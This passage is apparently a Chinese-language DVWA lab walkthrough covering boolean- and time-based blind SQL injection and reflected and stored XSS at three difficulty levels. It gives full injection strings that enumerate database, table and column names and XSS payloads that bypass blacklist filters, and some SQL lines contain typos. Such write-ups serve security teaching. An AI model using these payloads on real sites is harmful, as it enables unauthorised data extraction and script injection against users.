Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种：
`
User ID exists in the database.‘与‘ User ID is MISSING from the database.
`
因此这里是SQL盲注漏洞。

**漏洞利用**

`基于布尔的盲注：`

**1.判断是否存在注入，注入是字符型还是数字型**

当输入的参数为字符串时，称为字符型。`字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。`

输入1，显示相应用户存在：

![image-20200403134048181](https://i.loli.net/2020/04/03/2epAMrkh7WZtIbR.png)


输入1’ and 1=1 #，显示存在：

![image-20200403134048181](https://i.loli.net/2020/04/03/2epAMrkh7WZtIbR.png)

输入1’ and 1=2 #，显示不存在：

![image-20200403134132131.png](https://i.loli.net/2020/04/03/sH8qpIPw39nTMkS.png)


**2.猜解当前数据库名**

想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。
```sql
输入1’ and length(database())=1 #，显示不存在；
输入1’ and length(database())=2 #，显示不存在；
输入1’ and length(database())=3 #，显示不存在；
输入1’ and length(database())=4 #，显示存在：
```
说明数据库名长度为4。

下面采用二分法猜解数据库名。
```sql
输入1' and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
输入1' and ascii(substr(databse(),1,1))<122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
输入1' and ascii(substr(databse(),1,1))<109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
输入1' and ascii(substr(databse(),1,1))<103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
输入1' and ascii(substr(databse(),1,1))<100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
输入1' and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。
…
```
重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。

**3.猜解数据库中的表名**

首先猜解数据库中表的数量：
```sql
1' and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在
1' and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在
```
说明数据库中共有两个表。

接着挨个猜解表名：
```sql
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在 
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在
 … 
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
```
说明第一个表名长度为9。
```sql
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 # 显示存在
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 # 显示不存在
1' and ascii(substr((select table_name from information_schema.tables where table_schema=data'ase() limit 0,1),1,1))>103 # 显示不存在
```
说明第一个表的名字的第一个字符为小写字母g。


重复上述步骤，即可猜解出两个表名（guestbook、users）。

**4.猜解表中的字段名**

首先猜解表中字段的数量：
```sql
1' and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在 
...
1' and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在
```
说明users表有8个字段。

接着挨个猜解字段名：
```sql
1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在
…
1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在
```
说明users表的第一个字段为7个字符长度。

采用二分法，即可猜解出所有字段名。

**5.猜解数据**

同样采用二分法。

`基于时间的盲注：`

**1.判断是否存在注入，注入是字符型还是数字型**
```sql
输入1' and sleep(5) #，感觉到明显延迟；
输入1 and sleep(5) #，没有延迟；
```
说明存在字符型的基于时间的盲注。

**2.猜解当前数据库名**

首先猜解数据名的长度：
```sql
1' and if(length(database())=1,sleep(5),1) # 没有延迟 1' and if(length(database())=2,sleep(5),1) # 没有延迟 1' and if(length(database())=3,sleep(5),1) # 没有延迟 1' and if(length(database())=4,sleep(5),1) # 明显延迟
```
说明数据库名长度为4个字符。

接着采用二分法猜解数据库名：
```sql
1' and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 明显延迟 … 1' and if(ascii(substr(database(),1,1))<100,sleep(5),1)# 没有延迟 1' and if(ascii(substr(database(),1,1))>100,sleep(5),1)# 没有延迟 说明数据库名的第一个字符为小写字母d。
 …
```
重复上述步骤，即可猜解出数据库名。

**3.猜解数据库中的表名**

首先猜解数据库中表的数量：
```sql
1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟
1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
```
说明数据库中有两个表。

接着挨个猜解表名：
```sql
1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟
…
1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
```
说明第一个表名的长度为9个字符。

采用二分法即可猜解出表名。

**4.猜解表中的字段名**

首先猜解表中字段的数量：
```sql
1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟
…
1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
```
说明users表中有8个字段。

接着挨个猜解字段名：
```sql
1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟
…
1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
```
说明users表的第一个字段长度为7个字符。

采用二分法即可猜解出各个字段名。

**5.猜解数据**

同样采用二分法。

###  Medium

![image-20200403134213853](https://i.loli.net/2020/04/03/xqvpgwTZ9PWU2rA.png)


**分析：**
Medium级别的代码利用mysql_real_escape_string函数对特殊符号

\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

**漏洞利用**

虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。

上文有详细的盲注流程，这里就简要演示几个。

首先是`基于布尔的盲注：`
```sql
抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；
抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；
抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。
```
然后是`基于时间的盲注：`
```sql
抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；
抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；
抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。
```
### High

![image-20200403134236798.png](https://i.loli.net/2020/04/03/T9rGwI3HZWvDyJi.png)

**分析：**
High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

**漏洞利用**

虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：
```sql
抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；
抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；
抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。
```

## Xss(reflected)(反射型跨站脚本攻击)

>*   反射型Xss  <全称跨站脚本攻击，是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。>

**xss攻击思路**

![1.png](https://upload-images.jianshu.io/upload_images/10148719-8c1553b533dd7aa5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### Low

点击右下角的view source，查看源码

![2.png](https://upload-images.jianshu.io/upload_images/10148719-72549e654f996930.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

**分析：**
```arrary_key_exists()函数：判断$_GET的值中是否存在“name”键名。并且$_GET[‘name’]的值是否不为空，满足这些条件，直接输出下面的输出语句。可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。```

**`payload：<script>alert('XSS')</script>`**

![3.png](https://upload-images.jianshu.io/upload_images/10148719-b1bbb560ed131c81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### Medium

源码：

![4.png](https://upload-images.jianshu.io/upload_images/10148719-025020539d55aa81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

**分析：**
这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的`<script>`转化为空。然后在将name值的结果输出，这种防护机制是可以被轻松绕过的。

**1**.大小写混淆绕过（str_replace()函数不太完美，因为它区分大小写）

**`Payload：<ScRipt>alert(/xss/)</script>`**

**`Payload：<SCRIPT>alert(/xss/)</SCRIPT>`**

![5.png](https://upload-images.jianshu.io/upload_images/10148719-943f36abde2339a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

**2**.双写绕过

**`Payload：<sc<script>ript>alert(/xss/)</script>`**

![6.png](https://upload-images.jianshu.io/upload_images/10148719-b054d0287fb41f67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

**3**.构造不使用`<script>`标签进行绕过

**`payload：<img src=1 onerror=alert(/xss/)>`**

解释：<img ..>标签是添加一个图片，src是指定图片的url，onerror是指定加载图片时如果出现错误则要执行的事件,这里我们的图片url肯定是错误的，这个弹框事件也必定会执行

![7.png](https://upload-images.jianshu.io/upload_images/10148719-346eab3890f2c767.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### High

源码：

![8.png](https://upload-images.jianshu.io/upload_images/10148719-eb0514e4e28b8d0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

**分析：**
High级别的代码同样使用黑名单过滤输入，preg_replace() 函数将包含<script的字符，不管大小写，不管后面跟着1个或多个与之相同的字符都转换为空。用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。
**`Payload：<img src=1 onerror=alert('xss')>`**
![6.png](https://upload-images.jianshu.io/upload_images/10148719-b054d0287fb41f67.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

## XSS(Stored)(存储型跨站脚本攻击)

> 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。

### Low

![image-20200403140114962.png](https://i.loli.net/2020/04/03/DcoxeTjLSVKM8yp.png)

相关函数介绍：
```
trim(string,charlist) 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括\0、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。

mysqli_real_escape_string(string,connection) 函数会对字符串中的特殊符号（\x00，\n，\r，\，'，"，\x1a）进行转义。

stripslashes(string) 函数删除字符串中的反斜杠。
```
**分析**：
可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。

**Exploit**
message栏的利用：
输入`<script>alert(/name/)</script>`，成功弹框：

<img src="https://i.loli.net/2020/04/03/kl6X5ZIAvjBWzT1.png" alt="image-20200403140234311"  />

**name栏的利用：**
发现前端html中对name有字数长度限制:
Burpsuite 抓包改为`<script>alert(/name/)</script>`

![image-20200403140251503.png](https://i.loli.net/2020/04/03/qtpc7elTUKoD894.png)

点击Bp中Forward 后，成功弹窗：

![image-20200403140311971](https://i.loli.net/2020/04/03/wa4g3N1nstOobRM.png)

### Medium

![image-20200403140334188](https://i.loli.net/2020/04/03/7tPfxlAo6anS2Bq.png)

```php
strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。

addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。
```
**分析**：
可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了`<script>`字符串，仍然存在存储型的XSS。

**Exploit**
**1**.双写绕过
Burpsuite抓包改name参数为:`<sc<script>ript>alert(/name/)</script>`

![image-20200403140440550.png](https://i.loli.net/2020/04/03/brcmMd2n3wCIBFo.png)

**2**.大小写混淆绕过

Burpsuite抓包改name参数为:`<ScRipt>alert(/name/);</ScRipt>`

<img src="https://i.loli.net/2020/04/03/7tVsywGdQLOuKDY.png" alt="image-20200403140456913"  />

**3.**使用非 script 标签的 xss payload：

eg:img标签：

Burpsuite抓包改name参数为:`<img src=1 onerror=alert(/name/)>`

![image-20200403140509371.png](https://i.loli.net/2020/04/03/P48rwRItdYovXSB.png)

其他标签和利用还有很多很多….
以上抓包修改数据Forward后，均成功弹窗：
![image-20200403140524097.png](https://i.loli.net/2020/04/03/TnSMldjIgxtvXqm.png)

### High

![image-20200403140538783.png](https://i.loli.net/2020/04/03/rhBgMw4HaE8UQCn.png)

**分析**：
这里使用正则表达式过滤了`<script>`标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。

**Exploit**
Burpsuite抓包改name参数为`<img src=1 onerror=alert(/name/)>`
![image-20200403140643833.png](https://i.loli.net/2020/04/03/qIta128pKgxW4NR.png)
Forward后，成功弹窗：
![image-20200403140524097.png](https://i.loli.net/2020/04/03/TnSMldjIgxtvXqm.png)